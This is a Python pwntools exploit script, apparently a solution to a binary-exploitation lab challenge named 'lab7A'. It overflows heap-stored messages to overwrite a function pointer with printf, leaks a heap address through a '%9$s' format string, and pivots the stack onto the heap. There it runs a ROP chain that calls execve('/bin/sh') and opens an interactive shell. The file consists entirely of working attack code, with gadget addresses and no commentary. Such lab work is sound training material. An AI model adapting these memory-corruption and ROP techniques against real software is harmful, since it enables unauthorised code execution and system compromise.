from pwn import *

MESSAGES = 0x080eef60

PRINTF = 0x8050260

POP_EBX = 0x080481c9
POP_EDI = 0x0804846f
POP_ESP = 0x080bd1d6
POP_EDX = 0x0807030a
POP_ESI = 0x0804a2d5
POP_ECX = 0x080e76ad
POP_EAX = 0x080bd226

MOV_ESP_ECX = 0x080bd486
SYSCALL = 0x080709df

p = process("./lab7A")

def create_message(what, size):

    p.sendlineafter("Enter Choice", "1")
    p.sendlineafter("-Enter data length: ", str(size))
    p.sendafter("-Enter data to encrypt: ", what)

def edit_message(index, what):

    p.sendlineafter("Enter Choice", "2")
    p.sendlineafter("-Input message index to edit: ", str(index))
    p.sendafter("-Input new message to encrypt: ", what)

def print_message(index):

    p.sendlineafter("Enter Choice", "4")
    p.sendlineafter("-Input message index to print: ", str(index))

    return p.recvline()

def print_message_store_stack(index, what, final=False):

    p.sendlineafter("Enter Choice", "4")
    p.sendlineafter("-Input message index to print: ", str(index) + what)

    if final:
        return

    return p.recvline()

gdb_cmds = [
    #"br *0x8050260\n", # printf
    "br *" + hex(SYSCALL) + "\n",
    "continue\n"
]

# gdb.attach(p, ''.join(gdb_cmds))

create_message("A" * 0x82, 0x82)
create_message("overflowplease", len("overflowplease"))
create_message("B" * 0x82, 0x82)
create_message("overflowplease", len("overflowplease"))

""" Leak Heap pointer """
payload = "C" * 140
payload += p32(PRINTF)
payload += "|%9$s|\x00"
edit_message(0, payload)

res = print_message_store_stack(1, "ABCDEFG" + p32(MESSAGES + 4) + "GGGG")
MSG_0 = (u32(res.split("|")[1][0:4]))
log.success("MSG_0 at: " + hex(MSG_0))

""" Pivot to Heap and ROP """
payload = "A" * 140
payload += p32(MOV_ESP_ECX)

payload += p32(POP_EDI)
payload += "G" * 4
payload += p32(POP_ESI)
payload += "G" * 4

payload += p32(POP_EDX)
payload += p32(0x0);
payload += p32(POP_EBX)
payload += p32(MSG_0 + 56)
payload += p32(POP_ECX)
payload += p32(0x0)
payload += p32(POP_EAX)
payload += p32(0xb)
payload += p32(SYSCALL)
payload += "/bin/sh\x00"

edit_message(0, payload)
print_message_store_stack(1, p32(POP_ESP) + p32(MSG_0 + 4), True)

p.interactive()
